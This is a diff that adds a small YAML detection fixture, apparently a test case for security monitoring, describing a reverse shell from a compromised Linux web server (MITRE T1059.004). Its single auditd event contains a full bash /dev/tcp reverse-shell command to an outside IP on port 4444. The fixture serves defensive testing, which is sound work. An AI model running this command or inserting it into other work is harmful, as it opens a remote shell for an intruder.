@@ -1,0 +1,4 @@
+title: Reverse shell from a compromised Linux web server
+techniques: [T1059.004]
+events:
+  - {service: auditd, hostname: app-02, user: www-data, process_name: /bin/bash, command_line: 'bash -i >& /dev/tcp/203.0.113.66/4444 0>&1', message: execve}
